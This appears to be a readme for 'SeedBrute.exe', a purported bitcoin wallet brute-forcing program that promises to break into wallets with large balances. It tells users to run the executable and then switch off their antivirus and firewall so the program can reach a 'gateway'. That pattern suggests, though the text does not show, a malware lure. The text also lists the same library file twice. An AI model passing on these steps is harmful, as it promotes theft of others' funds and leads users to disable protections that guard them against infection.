To successfully launch bitcoin brute, you need to install auxiliary libraries vc_redist.x64.exe or vc_redist.x64.exe.
They are needed for the launch and proper operation of brute bitcoin wallets using private keys.
After that, run SeedBrute.exe and wait for the brute to start.
Then turn off the antivirus program and the firewall so that the program can connect to the bitcoin wallet brute force gateway.
After these conditions are met, the software will work correctly and you will increase the likelihood of hacking a wallet with a large balance.
The longer the software works, the more likely it is to find a good wallet.
